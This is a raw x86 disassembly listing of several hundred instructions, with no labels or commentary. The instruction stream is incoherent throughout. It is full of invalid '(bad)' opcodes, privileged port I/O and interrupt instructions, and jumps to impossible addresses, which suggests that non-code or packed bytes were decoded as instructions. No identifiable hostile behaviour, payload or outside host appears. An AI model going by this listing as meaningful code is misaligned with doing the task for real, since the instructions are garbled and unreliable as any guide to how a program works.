  40ece9:	mov    ecx,DWORD PTR [eax]
  40eceb:	cld    
  40ecec:	(bad)  
  40eced:	jmp    0x40ecf0
  40ecef:	mov    eax,esi
  40ecf1:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ecf7:	rcl    BYTE PTR [esi+0xf],1
  40ecfa:	iret   
  40ecfb:	inc    ebp
  40ecfc:	leave  
  40ecfd:	(bad)  
  40ecfe:	dec    DWORD PTR [ecx]
  40ed00:	mov    eax,esi
  40ed02:	mov    eax,DWORD PTR [edi]
  40ed04:	mov    dh,0xd1
  40ed07:	push   es
  40ed08:	nop
  40ed09:	(bad)  
  40ed0a:	inc    DWORD PTR [ebx]
  40ed0c:	push   esi
  40ed0d:	leave  
  40ed0e:	iret   
  40ed0f:	add    al,0x46
  40ed11:	push   ebp
  40ed12:	in     eax,0xec
  40ed14:	push   ebp
  40ed15:	push   ecx
  40ed16:	inc    DWORD PTR [ebp+0x56]
  40ed19:	mov    DWORD PTR [esi-0x4],eax
  40ed1c:	loope  0x40ed73
  40ed1e:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ed24:	add    al,BYTE PTR [edx]
  40ed26:	mov    edx,DWORD PTR [ebp-0x17]
  40ed29:	cmp    edi,esi
  40ed2b:	jne    0x40ed2c
  40ed2d:	(bad)  
  40ed2e:	push   esi
  40ed2f:	pop    es
  40ed30:	push   ebp
  40ed31:	mov    ebp,esp
  40ed33:	or     BYTE PTR [ebp+0x41],al
  40ed36:	add    edi,edx
  40ed38:	sub    BYTE PTR [eax-0x4],al
  40ed3b:	ret    0xc275
  40ed3e:	add    DWORD PTR [eax],eax
  40ed40:	sbb    al,0x8b
  40ed42:	mov    edx,DWORD PTR [ecx+0x14]
  40ed45:	lea    edx,[edx-0x1ba7508]
  40ed4b:	push   esi
  40ed4c:	enter  0xd375,0xb8
  40ed50:	test   DWORD PTR [esi],0x6ce0750
  40ed56:	enter  0xd375,0x3b
  40ed5a:	neg    DWORD PTR [esi+0x50]
  40ed5d:	or     cl,dl
  40ed5f:	inc    edx
  40ed60:	(bad)  
  40ed61:	in     eax,dx
  40ed62:	in     al,dx
  40ed63:	(bad)  
  40ed64:	sub    eax,DWORD PTR [ebx]
  40ed66:	inc    eax
  40ed67:	in     eax,dx
  40ed68:	push   eax
  40ed69:	add    dl,BYTE PTR [eax-0x37]
  40ed6c:	push   edi
  40ed6d:	push   ebp
  40ed6e:	imul   ah
  40ed70:	adc    DWORD PTR [ecx-0x1],0x45
  40ed74:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ed7a:	lea    edi,[eax-0x7fff4ca]
  40ed80:	mov    eax,0x4550402
  40ed85:	cmp    ebp,ecx
  40ed87:	jne    0x40ed34
  40ed89:	mov    eax,DWORD PTR ds:0x241e808
  40ed8f:	loope  0x40ed91
  40ed91:	inc    eax
  40ed92:	stc    
  40ed93:	xlat   BYTE PTR ds:[ebx]
  40ed94:	ss inc ecx
  40ed96:	aas    
  40ed97:	in     eax,0x7d
  40ed99:	ret    0x8b
  40ed9c:	lock mov edi,DWORD PTR [ebp-0x18]
  40eda0:	and    edi,edi
  40eda2:	mov    edi,edi
  40eda4:	call   0xe40eee80
  40eda9:	push   es
  40edaa:	add    al,ch
  40edac:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40edb3:	(bad)  
  40edb4:	hlt    
  40edb5:	add    eax,0xffd3e87d
  40edba:	cmp    bh,0x8
  40edbd:	(bad)  
  40edbe:	fld    DWORD PTR [esi]
  40edc0:	out    dx,al
  40edc1:	call   0xff9fecc9
  40edc6:	cmp    al,0x46
  40edc8:	shr    esp,0x8
  40edcb:	(bad)  
  40edcc:	pop    es
  40edcd:	fisttp QWORD PTR [ebp+0xe577eff]
  40edd3:	push   ebx
  40edd4:	add    BYTE PTR [ebx+0x24008b56],cl
  40edda:	add    BYTE PTR [ebp+0x50],al
  40eddd:	push   eax
  40edde:	add    DWORD PTR [ebx+0x757d1834],ecx
  40ede4:	sub    edx,DWORD PTR [esi-0x24]
  40ede7:	jne    0x40ed9f
  40ede9:	lods   eax,DWORD PTR ds:[esi]
  40edea:	mov    edx,DWORD PTR [edx-0x34]
  40eded:	dec    esi
  40edee:	out    0x83,eax
  40edf0:	into   
  40edf1:	push   edi
  40edf3:	loopne 0x40edc3
  40edf5:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40edf9:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ee00:	rol    DWORD PTR [edx],0x8
  40ee03:	mov    esp,ecx
  40ee05:	cmp    DWORD PTR [ebx],0xc
  40ee08:	mov    esi,0x5001c0
  40ee0d:	push   eax
  40ee0e:	push   cs
  40ee0f:	push   eax
  40ee10:	(bad)  
  40ee11:	sub    edx,edi
  40ee13:	push   esi
  40ee14:	adc    al,0xcb
  40ee16:	ins    DWORD PTR es:[edi],dx
  40ee17:	mov    eax,0x203e8
  40ee1c:	add    al,ah
  40ee1e:	inc    esi
  40ee1f:	mov    al,ch
  40ee21:	pop    es
  40ee22:	add    DWORD PTR [eax],0x1
  40ee25:	add    dh,al
  40ee27:	add    ah,ch
  40ee29:	rol    DWORD PTR [edx-0xd],1
  40ee2c:	cli    
  40ee2d:	push   0x4a
  40ee2f:	pop    ecx
  40ee30:	retf   0xfe6
  40ee33:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ee39:	(bad)  
  40ee3a:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ee40:	(bad)  
  40ee41:	sub    ebp,DWORD PTR [ebx]
  40ee43:	and    al,0x52
  40ee45:	(bad)  
  40ee46:	dec    edi
  40ee47:	inc    ebp
  40ee48:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ee4f:	add    BYTE PTR [ebp-0x7b],dh
  40ee52:	pop    eax
  40ee53:	add    BYTE PTR [edx+0x0],bl
  40ee56:	pop    edx
  40ee57:	dec    ebp
  40ee58:	jmp    DWORD PTR [ebx]
  40ee5a:	and    al,0xec
  40ee5c:	push   edx
  40ee5d:	out    0x64,eax
  40ee5f:	jmp    0xd3f2e464
  40ee64:	jmp    0x40eebe
  40ee66:	mov    al,0xfe
  40ee68:	dec    BYTE PTR [ebp-0x18fd8018]
  40ee6e:	add    BYTE PTR [esi+ebp*1],bh
  40ee71:	pop    edx
  40ee72:	icebp  
  40ee73:	mov    eax,cs
  40ee75:	ins    BYTE PTR es:[edi],dx
  40ee76:	adc    eax,0x75510000
  40ee7b:	mov    esi,0x70158
  40ee80:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ee86:	mov    edi,esp
  40ee88:	cld    
  40ee89:	jge    0x40ef00
  40ee8b:	(bad)  
  40ee8d:	aas    
  40ee8e:	and    al,0x6d
  40ee90:	adc    cl,0x1
  40ee93:	mov    eax,DWORD PTR [eax]
  40ee95:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ee9b:	dec    ebp
  40ee9c:	add    eax,ebp
  40ee9e:	add    BYTE PTR [edx],al
  40eea0:	fadd   DWORD PTR [eax]
  40eea2:	stc    
  40eea3:	enter  0xee00,0x8b
  40eea7:	sbb    eax,0x1
  40eeaa:	sbb    esi,ecx
  40eeac:	in     al,0x0
  40eeae:	in     eax,dx
  40eeaf:	add    BYTE PTR [eax],al
  40eeb1:	jne    0x40ee3e
  40eeb3:	cmp    edx,esp
  40eeb5:	jb     0x40eec0
  40eeb7:	jmp    0x40ef2e
  40eeb9:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eebf:	add    BYTE PTR [ebx+0x4d83d840],cl
  40eec5:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40eecb:	jb     0x40ee56
  40eecd:	pop    edx
  40eece:	fadd   QWORD PTR [ebx-0x7445faa1]
  40eed4:	or     dh,BYTE PTR [edx+0x0]
  40eed7:	inc    edx
  40eed8:	or     dl,bh
  40eeda:	xlat   BYTE PTR ds:[ebx]
  40eedb:	dec    edx
  40eedc:	push   edi
  40eedd:	add    al,0x7
  40eedf:	leave  
  40eee0:	rol    DWORD PTR [edx+eax*1],0x7
  40eee4:	add    ecx,ecx
  40eee6:	mov    edx,ecx
  40eee8:	int3   
  40eee9:	jmp    0x40eea9
  40eeeb:	mov    al,0x0
  40eeed:	(bad)  
  40eeee:	jne    0x40eed8
  40eef0:	mov    eax,DWORD PTR [edx]
  40eef2:	call   0xc1556bf7
  40eef7:	pop    edi
  40eef8:	add    ebx,DWORD PTR [ecx-0x37]
  40eefb:	pop    ecx
  40eefc:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40ef03:	push   es
  40ef04:	mov    eax,DWORD PTR [eax]
  40ef06:	int3   
  40ef07:	add    ch,al
  40ef09:	jae    0x40eef3
  40ef0b:	int    0x1
  40ef0d:	enter  0x3000,0x18
  40ef11:	add    BYTE PTR [ebp+0x75],al
  40ef14:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ef1a:	push   0x2
  40ef1c:	pop    ecx
  40ef1d:	add    BYTE PTR [eax],cl
  40ef1f:	push   ebx
  40ef20:	lea    edi,[edi+eax*2]
  40ef23:	mov    al,0x1
  40ef25:	jb     0x40ef27
  40ef27:	mov    al,0x10
  40ef29:	push   eax
  40ef2a:	add    al,0x75
  40ef2c:	add    BYTE PTR [ebx],ch
  40ef2e:	add    ebx,esp
  40ef30:	int3   
  40ef31:	jne    0x40ef43
  40ef33:	movsx  edx,cl
  40ef36:	add    DWORD PTR [eax],eax
  40ef38:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ef3f:	mov    gs,edi
  40ef41:	add    BYTE PTR [eax-0x50],ch
  40ef44:	add    al,ch
  40ef46:	mov    eax,DWORD PTR [ecx]
  40ef48:	sub    eax,DWORD PTR [eax]
  40ef4a:	jb     0x40efc1
  40ef4c:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ef50:	jge    0x40ef3a
  40ef52:	add    al,0x1
  40ef54:	add    DWORD PTR [eax],0x0
  40ef57:	jne    0x40ef59
  40ef59:	je     0x40efa0
  40ef5b:	mov    eax,DWORD PTR [edi]
  40ef5d:	ror    BYTE PTR [ebp+0x4d],1
  40ef60:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ef67:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ef6d:	mov    DWORD PTR [ebx],ebp
  40ef6f:	fadd   DWORD PTR [eax+0x75]
  40ef72:	inc    eax
  40ef73:	pop    eax
  40ef74:	lea    ebx,[ecx+0x4f]
  40ef77:	push   0xb1000003
  40ef7c:	out    dx,eax
  40ef7d:	add    ebp,DWORD PTR [edx+edx*2]
  40ef80:	add    BYTE PTR [ebx+ecx*4],bh
  40ef83:	mov    ch,BYTE PTR [ebx]
  40ef85:	jb     0x40eff9
  40ef87:	add    al,0x89
  40ef89:	push   eax
  40ef8a:	call   0x84293cfc
  40ef8f:	add    DWORD PTR [eax+eax*1],eax
  40ef92:	jae    0x40efa8
  40ef94:	icebp  
  40ef95:	inc    ebp
  40ef96:	mov    eax,DWORD PTR gs:[ecx]
  40ef99:	int3   
  40ef9a:	out    dx,al
  40ef9b:	loopne 0x40efea
  40ef9d:	sub    eax,DWORD PTR [edx]
  40ef9f:	push   0xffffff83
  40efa1:	pop    esi
  40efa2:	push   cs
  40efa3:	jl     0x40efbe
  40efa5:	add    al,0xaf
  40efa7:	xor    eax,0x832b6d00
  40efac:	mov    eax,DWORD PTR [edx]
  40efae:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40efb4:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40efba:	inc    ebp
  40efbb:	shr    ebx,0x3
  40efbe:	or     DWORD PTR [eax],0x4
  40efc1:	push   0xffffffa5
  40efc3:	pop    esi
  40efc4:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40efcb:	jmp    0x40f02a
  40efcd:	mov    edi,0xff0272
  40efd2:	fdivr  QWORD PTR [ebp+0x5d]
  40efd5:	push   0x4e
  40efd7:	pop    ecx
  40efd8:	call   0x4133dd
  40efdd:	mov    DWORD PTR [ebx],eax
  40efdf:	in     al,0xc8
  40efe1:	rol    BYTE PTR [ebp-0x75],0xc1
  40efe5:	call   0xaaf1c6
  40efea:	pop    esi
  40efeb:	enter  0xceff,0x8b
  40efef:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eff3:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40effa:	je     0x40effc
  40effc:	or     DWORD PTR [ebx-0x74183b24],eax
  40f002:	jne    0x40efe8
  40f004:	jmp    0x40efff
  40f006:	push   DWORD PTR [edx-0x24]
  40f009:	push   0x4d
  40f00b:	pop    ecx
  40f00c:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40f010:	jge    0x40f018
  40f012:	mov    eax,eax
  40f014:	sub    ebp,DWORD PTR [edx+0x24]
  40f017:	pop    esi
  40f018:	inc    ebp
  40f019:	mov    esp,0x8b6077
  40f01e:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40f024:	lods   al,BYTE PTR ds:[esi]
  40f025:	add    BYTE PTR [ebx],bh
  40f027:	enter  0xce73,0x49
  40f02b:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40f033:	stc    
  40f034:	jge    0x40f0a8
  40f036:	jnp    0xdd407397
  40f03c:	call   0xc3f112
  40f041:	fadd   st(0),st
  40f043:	dec    esi
  40f044:	ins    BYTE PTR es:[edi],dx
  40f045:	stc    
  40f046:	cmp    al,0x73
  40f048:	push   ebp
  40f049:	mov    eax,0xf8028b
  40f04e:	jne    0x40f011
  40f050:	mov    esi,ecx
  40f052:	mov    esp,DWORD PTR [ebp+0x2c]
  40f055:	add    edi,DWORD PTR [ebp-0x24]
  40f058:	sub    esp,eax
  40f05a:	and    al,0x45
  40f05c:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40f062:	sbb    al,0xee
  40f064:	pop    esi
  40f065:	call   0x80f095
  40f06a:	fsubr  st,st(3)
  40f06c:	sti    
  40f06d:	add    BYTE PTR gs:[ecx],bh
  40f070:	add    eax,esp
  40f072:	add    DWORD PTR [esi],eax
  40f074:	rol    DWORD PTR [ebp+0x8],0x29
  40f078:	mov    esp,eax
  40f07a:	clc    
  40f07b:	jne    0x40f0f2
  40f07d:	mov    eax,0x8b0673
  40f082:	loopne 0x40f0c9
  40f084:	loopne 0x40f00f
  40f086:	lods   al,BYTE PTR ds:[esi]
  40f087:	int3   
  40f088:	inc    ebp
  40f089:	mov    DWORD PTR gs:[eax+edi*8],eax
  40f08d:	add    al,0xc3
  40f08f:	sub    ecx,DWORD PTR [ebp+0x47]
  40f092:	(bad)  
  40f094:	shr    BYTE PTR [ebp-0x1f],0xe8
  40f098:	add    eax,DWORD PTR [eax]
  40f09a:	call   0x642b19f
  40f09f:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40f0a5:	dec    esi
  40f0a6:	ins    DWORD PTR es:[edi],dx
  40f0a7:	in     al,dx
  40f0a8:	lea    eax,[eax]
  40f0aa:	inc    ebp
  40f0ab:	inc    ebp
  40f0ac:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40f0b2:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40f0bc:	and    al,0xdc
  40f0be:	ror    DWORD PTR [edx+0x24],0xf7
  40f0c2:	or     BYTE PTR [ebp+0x4c],dh
  40f0c5:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40f0c9:	stos   BYTE PTR es:[edi],al
  40f0ca:	adc    edx,edi
  40f0cc:	inc    esp
  40f0cd:	add    edi,DWORD PTR [eax]
  40f0cf:	jne    0x40f0b4
  40f0d1:	mov    DWORD PTR [eax-0x7449db04],ecx
  40f0d7:	cmp    ecx,DWORD PTR [edi]
  40f0d9:	sub    BYTE PTR [ebp-0x7e],dl
  40f0dc:	sar    ebp,0xb
  40f0df:	jmp    FWORD PTR [edi+0x2400392a]
  40f0e5:	sub    esi,DWORD PTR [ebx-0x73]
  40f0e8:	mov    esp,DWORD PTR [ecx+edi*4]
  40f0eb:	mov    ecx,DWORD PTR [eax]
  40f0ed:	and    BYTE PTR [eax],al
  40f0ef:	jne    0x40f0bb
  40f0f1:	sub    ebp,ecx
  40f0f3:	sbb    BYTE PTR [esi+0x32],ah
  40f0f6:	dec    ebp
  40f0f7:	push   ebp
  40f0f8:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40f0fe:	ret    
  40f0ff:	mov    edx,ebp
  40f101:	leave  
  40f102:	sub    DWORD PTR [esi+0x24],ebx
  40f105:	ret    0x2b
  40f108:	pop    ax
  40f10a:	push   ebp
  40f10b:	rol    BYTE PTR [ebx],0xeb
  40f10e:	add    DWORD PTR [ecx+0x6c0001],0x40
  40f115:	jb     0x40f16c
  40f117:	ret    
  40f118:	in     al,dx
  40f119:	jecxz  0x40f0a6
  40f11b:	push   esi
  40f11c:	xchg   esp,eax
  40f11d:	jne    0x40f11f
  40f11f:	cmp    edx,DWORD PTR [esi+0x1c]
  40f122:	jne    0x40f108
  40f124:	mov    eax,DWORD PTR [ebp-0x77]
  40f127:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f12e:	mov    esi,DWORD PTR [ebp-0x75]
  40f131:	pop    esi
  40f132:	nop
  40f133:	mov    eax,DWORD PTR [eax]
  40f135:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f13b:	add    al,0x0
  40f13d:	inc    ebp
  40f13e:	mov    eax,DWORD PTR [ebx]
  40f140:	mov    ebp,ebx
  40f142:	cmp    al,0xf
  40f144:	or     al,al
  40f146:	inc    ebp
  40f147:	inc    ebp
  40f148:	xor    eax,0x8bc89c8b
  40f14d:	ins    BYTE PTR es:[edi],dx
  40f14e:	cld    
  40f14f:	add    BYTE PTR [edi+0x566c16c0],dh
  40f155:	add    BYTE PTR [ecx-0x5],dl
  40f158:	add    eax,0x17200
  40f15d:	sbb    al,0x85
  40f15f:	dec    esp
  40f160:	je     0x40f19a
  40f162:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f166:	add    BYTE PTR [ebx],bh
  40f168:	(bad)  
  40f169:	and    al,0x32
  40f16b:	jae    0x40f109
  40f16d:	mov    cl,cl
  40f16f:	inc    DWORD PTR [esp]
  40f172:	push   ebp
  40f173:	shr    esp,0x8
  40f176:	in     al,dx
  40f177:	push   esp
  40f178:	add    DWORD PTR [eax],esp
  40f17a:	add    bl,cl
  40f17c:	inc    ebp
  40f17d:	mov    bh,0x53
  40f17f:	add    BYTE PTR [ebp-0x17],al
  40f182:	push   esi
  40f183:	cmovne ecx,edx
  40f186:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f18a:	push   edi
  40f18b:	pop    ss
  40f18c:	xor    eax,0x89009cd9
  40f191:	add    ah,bh
  40f193:	sub    eax,DWORD PTR [ebp-0x3f]
  40f196:	aad    0x5
  40f198:	inc    ebp
  40f199:	add    edx,edx
  40f19b:	add    BYTE PTR [ebp-0x40],al
  40f19e:	xlat   BYTE PTR ds:[ebx]
  40f19f:	ins    BYTE PTR es:[edi],dx
  40f1a0:	inc    ebp
  40f1a1:	inc    eax
  40f1a2:	and    ecx,eax
  40f1a4:	dec    eax
  40f1a5:	add    eax,0x20204c45
  40f1aa:	inc    ebp
  40f1ab:	fnstcw WORD PTR [esi+0x29]
  40f1ae:	leave  
  40f1af:	add    BYTE PTR [esi+0xc000c0],bh
  40f1b5:	lea    eax,[esp-0x34]
  40f1b9:	ret    
  40f1ba:	mov    dh,0x8b
  40f1bc:	xor    edx,DWORD PTR [ecx+0x3]
  40f1bf:	mov    al,BYTE PTR [ecx+0x1]
  40f1c2:	sbb    BYTE PTR [eax],al
  40f1c4:	stc    
  40f1c5:	mov    esi,DWORD PTR [edx+0x8]
  40f1c8:	(bad)  
  40f1c9:	les    esi,FWORD PTR ss:[ecx]
  40f1cc:	(bad)  
  40f1cd:	mov    al,ch
  40f1cf:	add    esi,eax
  40f1d1:	add    dh,al
  40f1d3:	or     esi,eax
  40f1d5:	mov    dl,0xc7
  40f1d7:	add    esi,eax
  40f1d9:	add    al,cl
  40f1db:	push   cs
  40f1dc:	mov    BYTE PTR [edx+0xc601c9],0xca
  40f1e3:	or     BYTE PTR [ebx],dh
  40f1e5:	dec    ecx
  40f1e6:	lea    eax,[ebx]
  40f1e8:	or     eax,0x18fc0fc7
  40f1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ee:	(bad)  
  40f1f0:	fiadd  WORD PTR [ebp-0x78]
  40f1f3:	jae    0xed75f942
  40f1f9:	or     BYTE PTR [ebp+0x7],al
  40f1fc:	loope  0x40f19b
  40f1fe:	inc    ebp
  40f1ff:	xor    dl,dh
  40f201:	pop    esi
  40f202:	inc    ebp
  40f203:	shr    edx,0xc
  40f206:	inc    ebp
  40f207:	and    ch,0x1
  40f20a:	inc    ebp
  40f20b:	add    bh,bl
  40f20d:	add    BYTE PTR [ebp-0x7b],al
  40f210:	out    dx,al
  40f211:	clc    
  40f212:	inc    ebp
  40f213:	ret    0xd7
  40f216:	inc    ebp
  40f217:	mov    edi,DWORD PTR [esi-0x7f]
  40f21a:	leave  
  40f21b:	sub    al,0x44
  40f21d:	add    BYTE PTR [ebx+ecx*4-0x76cce34a],bh
  40f224:	add    ebx,DWORD PTR [ecx+eax*2]
  40f227:	(bad)  
  40f228:	sbb    al,ah
  40f22a:	stc    
  40f22b:	test   DWORD PTR [edx-0x8],esi
  40f22e:	lea    edi,[edi-0x7007aa4]
  40f234:	mov    DWORD PTR [ebp-0x24],edi
  40f237:	(bad)  
  40f238:	dec    ebp
  40f239:	int3   
  40f23a:	mov    eax,0x71cdfcc6
  40f23f:	mov    BYTE PTR [ecx],0xce
  40f242:	(bad)  
  40f243:	(bad)  
  40f244:	dec    edi
  40f246:	jmp    FWORD PTR [edx-0x38]
  40f249:	(bad)  
  40f24a:	or     dl,al
  40f24c:	jge    0x40f214
  40f24e:	(bad)  
  40f24f:	shl    esp,1
  40f251:	xor    eax,DWORD PTR [ebp+0x45caf85a]
  40f257:	add    BYTE PTR [ebx+0xd8c8d],cl
  40f25d:	rdpmc  
  40f25f:	sbb    BYTE PTR [edi+0x7de08da],bh
  40f265:	mov    BYTE PTR [ebp+0x39063283],bl
  40f26b:	in     eax,dx
  40f26c:	cmovne ebx,DWORD PTR [edx]
  40f26f:	jecxz  0x40f271
  40f271:	inc    ebp
  40f272:	mov    esp,ecx
  40f274:	sbb    al,0x45
  40f276:	mov    ebx,edx
  40f278:	add    DWORD PTR [ebp+0x0],eax
  40f27b:	loopne 0x40f27e
  40f27d:	inc    ebp
  40f27e:	dec    ebp
  40f27f:	and    DWORD PTR [ebx+0x208045],ecx
  40f285:	inc    ebp
  40f286:	mov    DWORD PTR [esi+0x6a],edi
  40f289:	leave  
  40f28a:	mov    DWORD PTR [esp+edx*8-0x3c],0x33e5b6d6
  40f292:	inc    ebp
  40f293:	add    ebx,edi
  40f295:	inc    ecx
  40f296:	xlat   BYTE PTR ds:[ebx]
  40f297:	sbb    BYTE PTR [ebp-0x758d2b07],cl
  40f29d:	(bad)  
  40f29e:	xor    bh,BYTE PTR [eax+eax*4+0x8bd36c6]
  40f2a5:	(bad)  
  40f2a6:	dec    esi
  40f2a7:	mov    esi,0xbf45c6f3
  40f2ac:	mov    esi,eax
  40f2ae:	fadd   st,st(0)
  40f2b0:	inc    esi
  40f2b2:	(bad)  
  40f2b3:	rcl    esp,0xc6
  40f2b6:	inc    edx
  40f2b8:	push   eax
  40f2b9:	mov    BYTE PTR [ebp-0x3d],0x33
  40f2bd:	xor    eax,DWORD PTR [ebx]
  40f2bf:	lea    edx,[eax+0xd]
  40f2c2:	inc    ebp
  40f2c3:	jae    0x8c1b58e1
  40f2c9:	ficomp WORD PTR [eax+ecx*4]
  40f2cc:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f2d3:	test   esi,edi
  40f2d5:	(bad)  
  40f2d6:	(bad)  
  40f2d7:	inc    DWORD PTR [eax]
  40f2d9:	inc    ebp
  40f2da:	add    BYTE PTR [ebx-0x10aa23d0],cl
  40f2e0:	mov    edx,DWORD PTR [ebx]
  40f2e2:	cld    
  40f2e3:	mov    edi,ecx
  40f2e5:	mov    ecx,ebx
  40f2e7:	pop    esp
  40f2e8:	sar    edi,0x1e
  40f2eb:	cmp    ebp,esp
  40f2ed:	jne    0x40f362
  40f2ef:	mov    DWORD PTR ds:0x22450be4,ecx
  40f2f5:	loopne 0x40f2e3
  40f2f7:	pushf  
  40f2f8:	jae    0x40f285
  40f2fa:	add    eax,0x3388e91c
  40f2ff:	add    esp,ebp
  40f301:	add    BYTE PTR [ebx-0x40],dh
  40f304:	jmp    0x91f35f
  40f309:	mov    ebx,0x6a7275
  40f30e:	pop    ecx
  40f30f:	add    DWORD PTR [ebp+eax*4-0x77],esi
  40f313:	add    bh,BYTE PTR [eax+0x0]
  40f316:	dec    DWORD PTR [ebp+0x66]
  40f319:	mov    ecx,DWORD PTR [ebp-0xff0084]
  40f31f:	mov    DWORD PTR [edx-0x75],ebp
  40f322:	data16 sbb al,0x8d
  40f325:	mov    edi,edi
  40f327:	add    edi,edi
  40f329:	add    BYTE PTR [edx+0x1],ch
  40f32c:	data16 or BYTE PTR [ebp-0x1e00bb],cl
  40f333:	jmp    0xee6a:0xd84dc766
  40f33a:	pop    ecx
  40f33b:	jle    0x40f2c6
  40f33d:	inc    ebp
  40f33e:	sbb    BYTE PTR [esi-0x37],0x8
  40f342:	test   edx,ecx
  40f344:	(bad)  
  40f345:	jmp    0x41017c49
  40f34a:	push   ebp
  40f34b:	jne    0x40f3b3
  40f34d:	lea    ecx,[ebp-0x2c]
  40f350:	mov    DWORD PTR [ebp-0x200158],0xfe4585d6
  40f35a:	sar    bh,0xeb
  40f35d:	mov    eax,edi
  40f35f:	loopne 0x40f311
  40f361:	(bad)  
  40f362:	rol    ebx,cl
  40f364:	jmp    0xe9c0:0xdf1c458b
  40f36b:	push   eax
  40f36c:	inc    bp
  40f36e:	inc    ebp
  40f36f:	mov    eax,ebp
  40f371:	cwde   
  40f372:	mov    DWORD PTR [eax],0xd4ffc7d4
  40f378:	add    bh,bh
  40f37a:	add    BYTE PTR [ecx],al
  40f37c:	call   0x1400b81
  40f381:	inc    DWORD PTR [ebp-0xb201f8]
  40f387:	xor    eax,DWORD PTR [ebp-0xc401fd]
  40f38d:	jne    0x40f31a
  40f38f:	mov    eax,ds:0x33c70be0
  40f394:	ret    
  40f395:	out    dx,eax
  40f396:	mov    edx,DWORD PTR ds:0xbc0a31c
  40f39c:	push   eax
  40f39d:	xor    eax,DWORD PTR [ebp-0x71]
  40f3a0:	mov    esi,DWORD PTR [edx-0x68]
  40f3a3:	mov    ds:0x33ff0b00,eax
  40f3a8:	(bad)  
  40f3a9:	mov    ecx,0x8b8d0008
  40f3ae:	call   FWORD PTR [edi+edi*8]
  40f3b1:	and    bh,bh
  40f3b3:	push   0x66
  40f3b5:	mov    bp,0xff8d
  40f3b9:	(bad)  
  40f3ba:	(bad)  
  40f3bb:	dec    DWORD PTR [edi]
  40f3bd:	mov    DWORD PTR [edx],eax
  40f3bf:	jp     0x40f3c1
  40f3c1:	(bad)  
  40f3c2:	mov    ecx,0x774f59
  40f3c7:	mov    ecx,eax
  40f3c9:	jl     0x40f354
  40f3cb:	dec    DWORD PTR [eax-0x74c73fa7]
  40f3d1:	mov    DWORD PTR [esi+0x7e],esp
  40f3d4:	push   ebp
  40f3d5:	dec    DWORD PTR [ebp-0x7676f2a7]
  40f3db:	or     BYTE PTR [ebx+eiz*2+0x4d6666c2],0x55
  40f3e3:	xor    ecx,DWORD PTR [ebp-0x7627e877]
  40f3e9:	call   DWORD PTR [eax+0x668dc233]
  40f3ef:	test   al,0x55
  40f3f1:	mov    DWORD PTR [ebp-0x76bade7c],ecx
  40f3f7:	into   
  40f3f8:	xchg   esp,eax
  40f3f9:	loop   0x40f384
  40f3fb:	(bad)  
  40f3fc:	xchg   esi,eax
  40f3fd:	lods   al,BYTE PTR ds:[esi]
  40f3fe:	ret    0x8bd3
  40f401:	in     eax,dx
  40f402:	inc    bp
  40f404:	dec    ebp
  40f405:	in     al,0xb9
  40f407:	xor    BYTE PTR [edi-0x39],cl
  40f40a:	add    BYTE PTR [ecx+esi*8+0x64e189ec],dh
  40f411:	(bad)  
  40f412:	(bad)  
  40f413:	mov    eax,0x85667e8b
  40f418:	mov    ch,0xfe
  40f41a:	(bad)  
  40f41b:	(bad)  
  40f41c:	inc    DWORD PTR [eax]
  40f41e:	jno    0x40f420
  40f420:	data16 mov bl,0xb5
  40f423:	add    bh,bh
  40f425:	mov    edi,edi
  40f427:	fmul   QWORD PTR [ecx-0x729501]
  40f42d:	aam    0x8d
  40f42f:	call   edi
  40f431:	push   eax
  40f432:	mov    DWORD PTR [ebp+0x6c],eax
  40f435:	xor    edi,edi
  40f437:	add    eax,DWORD PTR [ebx-0x76bafcb0]
  40f43d:	sub    DWORD PTR [esi+0x44],0xffffffff
  40f441:	mov    ecx,DWORD PTR [ebp-0x767f1ee4]
  40f447:	add    DWORD PTR [eax+0x0],esi
  40f44a:	push   DWORD PTR [eax]
  40f44c:	push   bp
  40f44e:	lea    ecx,[ebp-0x8701]
  40f454:	mov    DWORD PTR [ecx+0x74],edx
  40f457:	sar    bh,1
  40f459:	or     DWORD PTR [ebx-0x48000386],0x77
  40f460:	fs test edi,edi
  40f463:	add    al,0x33
  40f465:	add    BYTE PTR [ebx],al
  40f467:	adc    dh,BYTE PTR [ebx]
  40f469:	add    BYTE PTR [esi-0x75],ah
  40f46c:	test   DWORD PTR [esi-0x1],esp
  40f46f:	inc    ebp
  40f470:	inc    DWORD PTR [ebx-0x2ff00abb]
  40f476:	dec    ebp
